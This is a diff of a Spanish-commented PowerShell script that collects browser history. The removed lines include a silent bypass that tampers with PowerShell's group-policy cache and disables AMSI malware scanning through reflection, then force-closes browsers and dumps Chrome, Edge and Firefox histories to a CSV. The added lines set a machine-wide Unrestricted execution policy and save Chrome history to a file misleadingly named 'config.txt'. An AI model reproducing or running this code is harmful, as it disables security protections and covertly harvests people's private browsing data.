@@ -1,74 +1,67 @@
-# Autobypass silencioso (colocar al inicio)
+Set-ExecutionPolicy Unrestricted -Scope LocalMachine -Force
+Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force		
+Install-Module -Name PSSQLite -Force 
+
+# Importar el módulo pslite
+Import-Module PSSQLite
+
+# Ruta a la base de datos de historial de Chrome
+$dbPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
+
+# Verificar si el archivo de historial existe
+if (-not (Test-Path $dbPath)) {
+    Write-Host "El archivo de historial de Chrome no se encontró. Asegúrate de que Chrome esté cerrado." -ForegroundColor Red
+    exit
+}
+
+# Función para convertir la marca de tiempo de Chrome a una fecha legible
+function Convert-ChromeTime {
+    param (
+        [long]$chromeTime
+    )
+    $epoch = [datetime]::FromFileTimeUtc(116444736000000000)
+    return $epoch.AddSeconds($chromeTime / 1000000)
+}
+
+# Consultar la tabla 'urls' que contiene el historial de navegación
+$query = "SELECT url, title, last_visit_time FROM urls"
+
+# Ejecutar la consulta
 try {
-    $null = [Reflection.Assembly]::Load("System.Core")
-    $policyField = [PSObject].Assembly.GetType(
-        'System.Management.Automation.Utils'
-    ).GetField('cachedGroupPolicySettings', 'NonPublic,Static')
-    $policyField.SetValue($null, @{ 'ScriptExecution' = @{ 'EnableScripts' = '1' } })
-    
-    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
-        'amsiInitFailed', 'NonPublic,Static'
-    ).SetValue($null, $true)
-}
-catch { }
+    $results = Invoke-SqliteQuery -Query $query -DataSource $dbPath
 
-# Cerrar navegadores silenciosamente
-$browsers = 'chrome', 'msedge', 'firefox', 'msedgewebview2'
-$browsers | ForEach-Object {
-    try { Stop-Process -Name $_ -Force -ErrorAction Stop }
-    catch { }
-}
-Start-Sleep -Seconds 1
-
-# Función para obtener historiales
-function Get-BrowserHistory {
-    param($browser, $path, $query)
-    
-    try {
-        $tempFile = "$env:TEMP\$([Guid]::NewGuid())"
-        Copy-Item $path $tempFile -Force
-        
-        Import-Module PSSQLite -ErrorAction Stop
-        Invoke-SqliteQuery -DataSource $tempFile -Query $query | ForEach-Object {
-            [PSCustomObject]@{
-                Browser = $browser
-                URL     = $_.url
-                Title   = $_.title
-                Visits  = $_.visit_count
-                LastVisited = if ($browser -eq 'Firefox') {
-                    [DateTime]::new(1970,1,1).AddMilliseconds($_.visit_date)
-                } else {
-                    [DateTime]::FromFileTime(($_.last_visit_time * 10) + 116444736000000000)
-                }
-            }
+    # Convertir las marcas de tiempo y preparar los datos para guardar
+    $output = $results | ForEach-Object {
+        $lastVisitTime = Convert-ChromeTime $_.last_visit_time
+        [PSCustomObject]@{
+            URL           = $_.url
+            Title         = $_.title
+            LastVisitTime = $lastVisitTime
         }
-        Remove-Item $tempFile -Force
     }
-    catch { }
+
+    # Mostrar los resultados en la consola
+    $output | Format-Table -AutoSize
+
+    # Ruta de la carpeta donde se guardará el archivo
+    $outputFolder = "C:\Users"
+    $outputFilePath = Join-Path -Path $outputFolder -ChildPath "config.txt"
+
+    # Crear la carpeta si no existe
+    if (-not (Test-Path $outputFolder)) {
+        New-Item -ItemType Directory -Path $outputFolder | Out-Null
+    }
+
+    # Guardar los resultados en un archivo de texto
+    $output | ForEach-Object {
+        "URL: $($_.URL)"
+        "Título: $($_.Title)"
+        "Última visita: $($_.LastVisitTime)"
+        "----------------------------------------"
+    } | Out-File -FilePath $outputFilePath -Encoding UTF8
+
+    Write-Host "El historial de Chrome se ha guardado en: $outputFilePath" -ForegroundColor Green
 }
-
-# Recolectar todos los historiales
-$historial = @()
-
-# Chrome
-$historial += Get-BrowserHistory -browser 'Chrome' `
-    -path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" `
-    -query "SELECT url, title, last_visit_time, visit_count FROM urls"
-
-# Edge
-$historial += Get-BrowserHistory -browser 'Edge' `
-    -path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" `
-    -query "SELECT url, title, last_visit_time, visit_count FROM urls"
-
-# Firefox
-$firefoxPath = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" |
-               Select-Object -First 1 -ExpandProperty FullName
-$historial += Get-BrowserHistory -browser 'Firefox' -path $firefoxPath -query @"
-    SELECT p.url, p.title, v.visit_date, COUNT(p.id) as visit_count 
-    FROM moz_places p 
-    JOIN moz_historyvisits v ON p.id = v.place_id 
-    GROUP BY p.id
-"@
-
-# Exportar a CSV
-$historial | Export-Csv "$env:USERPROFILE\Downloads\HistorialNavegacion.csv" -NoTypeInformation
+catch {
+    Write-Host "Error al consultar el historial de Chrome: $_" -ForegroundColor Red
+}
